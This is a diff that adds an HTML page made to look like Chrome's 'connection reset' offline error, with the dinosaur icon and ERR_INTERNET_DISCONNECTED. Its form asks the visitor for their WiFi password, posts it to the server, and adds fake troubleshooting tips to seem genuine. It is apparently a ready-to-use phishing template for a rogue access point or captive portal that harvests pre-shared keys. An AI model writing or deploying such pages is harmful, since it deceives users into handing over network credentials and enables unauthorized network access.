@@ -1,0 +1,45 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,
+    maximum-scale=1.0, user-scalable=no">
+    <title i18n-content="title">Connection reset</title>
+    <link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />
+
+    <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
+    <div id="main-frame-error" class="interstitial-wrapper">
+        <div id="main-content">
+            <img class="dinosaur" src="/static/dinosaur.png" width="45" />
+            <div class="icon icon-offline" style="visibility: hidden;"></div>
+            <div id="main-message">
+                <h1>Your connection was reset</h1>
+                <h2>1 - Try connecting again</h2>
+                <form method="POST" action="/">
+                    <label for="PSK">Enter your WiFi password: </label><br />
+                    <input id="PSK" name="PSK" type="password" />
+                    <input type="submit" value="Connect" />
+                </form>
+                <h2>2 - If the problem persists</h2>
+                <p>You can try to diagnose the problem by taking the following steps:
+                <br />
+                Go to
+                <strong>
+                Applications &gt; System Preferences &gt; Network &gt; Assist me
+                </strong>
+                to test your connection.</p>
+                <div id="suggestions-list" >
+                    <p >Try:</p>
+                    <ul class="chrome-list">
+                        <li>Checking the network cable or router</li>
+                        <li>Resetting the modem or router</li>
+                        <li>Reconnecting to Wi-Fi</li>
+                    </ul>
+                </div>
+                <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
+            </div>
+        </div>
+        <div id="buttons" class="nav-wrapper suggested-right" >
+            <button id="details-button" class="text-button small-link singular">Details</button>
+        </div>
+    </body>
+</html>
